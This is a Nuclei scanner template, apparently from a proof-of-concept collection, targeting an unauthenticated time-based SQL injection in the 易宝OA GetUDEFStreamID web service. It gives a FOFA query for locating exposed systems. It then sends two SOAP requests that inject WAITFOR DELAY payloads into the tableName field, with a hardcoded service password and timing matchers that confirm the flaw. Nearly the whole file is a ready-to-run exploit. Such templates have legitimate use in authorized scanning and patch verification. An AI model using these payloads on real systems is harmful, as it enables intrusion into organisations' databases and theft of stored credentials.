common/config/pocs/nuclei-2025/易宝OA-GetUDEFStreamID-SQL延时注入.yaml

id: yibaoOA-GetUDEFStreamID-sql

info:
  name: 易宝OA GetUDEFStreamID SQL注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: app="顶讯科技-易宝OA系统"
    易宝OA GetUDEFStreamID接口处存在SQL注入漏洞，未经身份认证的攻击者可以通过此漏洞获取数据库敏感信息，用户名密码等凭据，进一步利用可获取服务器权限。
  reference:
    - https://mp.weixin.qq.com/s/bhBtIaPLeBSqkR8Bvfe2YA?token=17877307&lang=zh_CN
  tags: sql injection



http:
  - raw:
      - |
        POST /WebService/BasicService.asmx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/GetUDEFStreamID"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetUDEFStreamID xmlns="http://tempuri.org/">
              <tableName>';WAITFOR DELAY '0:0:4'--</tableName>
              <webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</webservicePassword>
            </GetUDEFStreamID>
          </soap:Body>
        </soap:Envelope>
      - |
        POST /WebService/BasicService.asmx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/GetUDEFStreamID"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetUDEFStreamID xmlns="http://tempuri.org/">
              <tableName>';WAITFOR DELAY '0:0:8'--</tableName>
              <webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</webservicePassword>
            </GetUDEFStreamID>
          </soap:Body>
        </soap:Envelope>
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and

